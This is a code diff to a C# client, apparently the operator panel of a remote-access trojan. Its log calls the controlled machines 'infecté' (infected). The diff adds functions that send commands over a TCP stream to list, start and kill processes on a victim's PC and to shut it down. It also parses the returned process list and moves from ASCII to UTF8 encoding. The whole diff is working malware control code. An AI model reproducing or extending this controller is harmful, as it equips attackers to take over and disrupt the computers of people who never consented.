@@ -46,14 +46,14 @@ namespace YTAH_COMMUNITY
         }
         public static void SelectUser(string userpost)
         {
-            byte[] b = Encoding.ASCII.GetBytes("SelectUser|" + Perso.Me.username + "|" + userpost);
+            byte[] b = Encoding.UTF8.GetBytes("SelectUser|" + Perso.Me.username + "|" + userpost);
             ns.Write(b, 0, b.Length);
         }
         public static void SendMessage(string msg)
         {
             try
             {
-                byte[] b = Encoding.ASCII.GetBytes(msg);
+                byte[] b = Encoding.UTF8.GetBytes(msg);
                 ns.Write(b, 0, b.Length);
             }
             catch(Exception ex)
@@ -62,12 +62,43 @@ namespace YTAH_COMMUNITY
             }
         }
         static string commandStart = "SC;" + Perso.Me.username + ";";
-        public static void SendPopUp(string content)
+        public static void RefreshVar()
         {
             commandStart = "SC;" + Perso.Me.username + ";";
-            byte[] b = Encoding.ASCII.GetBytes(commandStart + "sm|" + content);
+        }
+
+
+
+        public static void ListProcess()
+        {
+            byte[] b = Encoding.UTF8.GetBytes(commandStart + "LP|" + Perso.Me.username);
             ns.Write(b, 0, b.Length);
         }
+
+        public static void SendPopUp(string content)
+        {
+            byte[] b = Encoding.UTF8.GetBytes(commandStart + "sm|" + content);
+            ns.Write(b, 0, b.Length);
+        }
+        public static void ShutDown()
+        {
+            byte[] b = Encoding.UTF8.GetBytes(commandStart + "shut");
+            ns.Write(b, 0, b.Length);
+        }
+        public static void StartProcess(string processname)
+        {
+            byte[] b = Encoding.UTF8.GetBytes(commandStart + "SP|" + processname);
+            ns.Write(b, 0, b.Length);
+        }
+        public static void KillProcess(string processname)
+        {
+            byte[] b = Encoding.UTF8.GetBytes(commandStart + "KP|" + processname);
+            ns.Write(b, 0, b.Length);
+        }
+
+
+
+
         public static void ReceiveData(TcpClient client)
         {
             ns = client.GetStream();
@@ -77,7 +108,8 @@ namespace YTAH_COMMUNITY
             {
                 while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
                 {
-                    string d = Encoding.ASCII.GetString(receivedBytes, 0, byte_count);
+                    string d = Encoding.UTF8.GetString(receivedBytes, 0, byte_count);
+                    
                     string[] splitter = d.Split('|');
                     if (d.Contains("authsuccess"))
                     {
@@ -117,12 +149,37 @@ namespace YTAH_COMMUNITY
                                 break;
                             case "SelectFailed":
                                 MessageDisplayer.SelectBool(false, msg, secmsg);
+                                MessageBox.Show("L'utilisateur que vous essayez de séléctionner est probablement déconnecté \r\n toute tentative d'envoie de commande sur ce PC sera par conséquent inutile");
+                                break;
+                            case "ACTIVITY":
+                                MessageDisplayer.Log(msg);
                                 break;
                         }
+
                     }
                     if (d.Contains("empty"))
                     {
                         MessageDisplayer.Log("Aucun infecté !");
+                    }
+                    if (d.Contains("NewProcess"))
+                    {
+                        string[] split = d.Split('|');
+                        string processname = split[1];
+                        string processid = split[2];
+                        string processTitle = split[3];
+                        bool todo = true;
+                        CustomProcess cp = new CustomProcess(processname, processid, processTitle);
+                        foreach(CustomProcess cps in CustomProcess.customProcesses)
+                        {
+                            if(cps.processid == processid)
+                            {
+                                todo = false;
+                            }
+                        }
+                        if(todo == true)
+                        {
+                            CustomProcess.customProcesses.Add(cp);
+                        }
                     }
                     if (d.Contains("USERS"))
                     {
@@ -152,9 +209,10 @@ namespace YTAH_COMMUNITY
                                         if (!User.users.Contains(u))
                                         {
                                             User.users.Add(u);
+                                            MessageDisplayer.UserConnected(user);
 
                                         }
-                                        MessageDisplayer.UserConnected(user);
+                                        
                                     }
                                     catch
                                     {
